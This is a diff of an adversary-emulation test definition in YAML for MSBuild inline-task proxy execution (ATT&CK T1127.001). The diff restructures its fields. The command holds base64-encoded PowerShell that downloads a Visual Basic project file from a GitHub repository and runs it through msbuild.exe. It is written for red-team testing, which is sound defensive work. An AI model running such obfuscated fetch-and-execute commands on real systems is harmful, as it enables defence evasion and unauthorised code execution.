@@ -1,18 +1,16 @@
-- id: 60b73f64-7fa8-5142-a1de-16b2be8f67ac
+- requirements: []
   name: Soumaia ART Tests - MSBuild Bypass Using Inline Tasks (VB)
   description: Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print "Hello from a Visual Basic inline task!" to the screen.
   tactic: stealth
-  technique:
-    attack_id: T1127.001
-    name: 'Trusted Developer Utilities Proxy Execution: MSBuild'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHYAYgAuAHgAbQBsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXAB2AGIALgB4AG0AbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMgA3AC4AMAAwADEALwBzAHIAYwAvAHYAYgAuAHgAbQBsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXAB2AGIALgB4AG0AbAAiAAoA
-          )
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ".\vb.xml"
-        payloads:
-        - vb.xml
+  technique_id: T1127.001
+  technique_name: 'Trusted Developer Utilities Proxy Execution: MSBuild'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - vb.xml
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHYAYgAuAHgAbQBsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA= & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXAB2AGIALgB4AG0AbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMgA3AC4AMAAwADEALwBzAHIAYwAvAHYAYgAuAHgAbQBsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXAB2AGIALgB4AG0AbAAiAAoA ) & C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ".\vb.xml"
+  id: 60b73f64-7fa8-5142-a1de-16b2be8f67ac
